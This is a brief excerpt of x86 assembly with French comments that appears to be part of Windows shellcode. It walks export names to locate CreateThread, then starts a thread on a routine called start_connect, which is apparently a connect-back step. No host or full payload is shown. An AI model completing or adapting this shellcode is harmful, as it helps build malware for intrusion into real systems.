...
sub esp, 04h                    ; Création d'éspace dans la stack
xor eax, eax                    ; EAX à zero
mov [ebp - 04h], eax            ; CreateThread address
...
jne CT_loop
cmp dword [esi+4], 0x68546574 ;hTet
jne CT_loop
...
xor ebx,ebx ; Mise à 0 de EAX
push eax ; Return non catch
push eax ; Creation flag, lancement immédiat
push eax ; Vars passées
lea ebx, [start_connect]
push ebx ; méthode threadée
push eax ; Stack Size, NULL, même taille que le main process
push eax ; SECURITY_ATTRIBUTES NULL, non hérité
mov eax, [ebp - 04h] ; CreateThread
call eax

jmp comp2 ; On jump après start_connect pour pouvoir éditer notre shellcode sans problèmes
